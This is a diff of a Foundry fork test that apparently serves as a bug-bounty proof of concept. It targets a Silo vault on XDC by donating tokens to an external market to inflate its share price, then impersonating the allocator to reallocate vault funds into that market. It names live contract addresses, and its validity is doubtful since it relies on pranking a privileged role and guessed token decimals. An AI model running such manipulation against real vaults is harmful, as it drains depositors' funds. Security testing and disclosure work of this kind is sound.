@@ -13,75 +13,70 @@ interface ISiloVault is IERC4626 {
         uint256 assets;
     }
     function reallocate(MarketAllocation[] calldata allocations) external;
-    function isAllocator(address account) external view returns (bool);
 }
 
 contract SiloXDCForkTest is Test {
-    // RPC XinFin (XDC)
     string XDC_RPC_URL = "https://erpc.xinfin.network/"; 
     
-    // Alamat-alamat di XinFin (XDC)
     address constant USDC = 0xfA2958CB79b0491CC627c1557F441eF849Ca8eb1;
     address constant SILO_VAULT = 0x06083Db34F1E915FA5cd4e2A198f3680E3CE9c60; // 9Summits Vault
     address constant EXTERNAL_MARKET = 0xB38658B163E364DfFFDBC895f1b5d658d5e6C439; // Unverified Market
+    address constant SOURCE_MARKET = 0xd1ed56Ed95c02634D9e2385A04cd5b97078dd932; // Market lain di Vault
     
-    // TUGAS ANDA: Ganti dengan address pengirim (msg.sender) dari transaksi reallocate yang Anda temukan
+    // Address Allocator (Pastikan ini valid di XDC)
     address constant ALLOCATOR = 0x8e65743e23Ed13f593E7d4eb7ED3ddE1E1cB9bBf; 
 
     function setUp() public {
-        // Fork jaringan XDC
         uint256 forkId = vm.createFork(XDC_RPC_URL);
         vm.selectFork(forkId);
     }
 
     function test_BlindSandwichAttackOnXDC() public {
-        // 1. Cek Saldo Awal Vault
         uint256 vaultTVLBefore = IERC4626(SILO_VAULT).totalAssets();
         console.log("Vault TVL Sebelum Serangan :", vaultTVLBefore);
-
-        // Pastikan kita punya allocator yang benar (opsional: kita bypass check ini di test)
-        // Jika allocator salah, transaksi reallocate akan revert "Not Allocator"
         
-        // 2. Persiapan Attacker (Kita cetak 10 Juta USDC)
         address attacker = address(this);
-        // Karena USDC XDC mungkin 6 desimal, 10 Juta = 10_000_000 * 1e6
-        // Gunakan deal untuk memanipulasi saldo
-        deal(USDC, attacker, 10_000_000 * 1e6); 
+        // Kita beri attacker 10 Juta USDC (sesuaikan desimal jika perlu, asumsi 18 desimal untuk XDC tokens atau 6)
+        deal(USDC, attacker, 10_000_000 * 1e18); 
 
-        console.log("Mulai Blind Donation Attack ke External Market...");
-        
-        // 3. FRONT-RUN: Donasi paksa (Spot Manipulation) ke External Market
-        // Kita paksa market ini "mengira" mereka tiba-tiba kaya, untuk merusak harga share-nya
+        console.log("\n[1] FRONT-RUN: Attacker mendonasi uang ke External Market untuk memanipulasi harga...");
         vm.startPrank(attacker);
-        IERC20(USDC).transfer(EXTERNAL_MARKET, 10_000_000 * 1e6);
+        // Pompa harga Share Token dengan mengirim uang langsung (Spot Balance Attack)
+        IERC20(USDC).transfer(EXTERNAL_MARKET, 5_000_000 * 1e18);
         vm.stopPrank();
 
-        // 4. EKSEKUSI VAULT: Impersonate Allocator
+        console.log("\n[2] EKSEKUSI VAULT: Allocator memindahkan dana dari Source Market ke External Market...");
         vm.startPrank(ALLOCATOR);
         
-        // Kita asumsikan Allocator ingin menarik (redeem) semua aset dari market tersebut
-        ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](1);
+        // Kita buat 2 instruksi agar balance totalSupplied == totalWithdrawn
+        ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](2);
+        
+        // Tarik semua dana dari Source Market
         allocations[0] = ISiloVault.MarketAllocation({
-            market: IERC4626(EXTERNAL_MARKET),
-            assets: 0 // Dalam kode SiloVault, assets: 0 biasanya berarti menarik seluruh saldo dari market itu
+            market: IERC4626(SOURCE_MARKET),
+            assets: 0 // 0 berarti withdraw seluruhnya
         });
         
-        // Eksekusi fungsi reallocate yang cacat tanpa slippage protection!
+        // Setorkan semua dana hasil tarikan tadi ke External Market yang sudah kita manipulasi
+        allocations[1] = ISiloVault.MarketAllocation({
+            market: IERC4626(EXTERNAL_MARKET),
+            assets: type(uint256).max // type(max) berarti deposit semua dana yang tersedia
+        });
+        
+        // Eksekusi fungsi reallocate! (Ketiadaan slippage protection diuji di sini)
         ISiloVault(SILO_VAULT).reallocate(allocations);
         vm.stopPrank();
 
-        // 5. CEK KERUSAKAN VAULT
+        console.log("\n[3] CEK KERUSAKAN VAULT...");
         uint256 vaultTVLAfter = IERC4626(SILO_VAULT).totalAssets();
         console.log("Vault TVL Setelah Serangan :", vaultTVLAfter);
 
         if (vaultTVLAfter < vaultTVLBefore) {
             console.log("\n[+] BINGO! SERANGAN SUKSES!");
-            console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "USDC");
-            console.log("[+] Triager Tidak Bisa Membantah Lagi!");
-        } else if (vaultTVLAfter > vaultTVLBefore) {
-            console.log("\n[-] Aset malah bertambah. Uang donasi kita tertelan oleh market (Mirip Silo.sol)");
+            console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "Wei/USDC");
+            console.log("[+] Bukti konkret bahwa ketiadaan slippage protection menghancurkan dana Vault di Mainnet!");
         } else {
-            console.log("\n[-] Gagal. TVL tidak berubah. External Market kebal terhadap spot donation.");
+            console.log("\n[-] Gagal. TVL tidak berubah atau bertambah. Market mungkin menggunakan Oracle atau Internal Accounting.");
         }
     }
 }
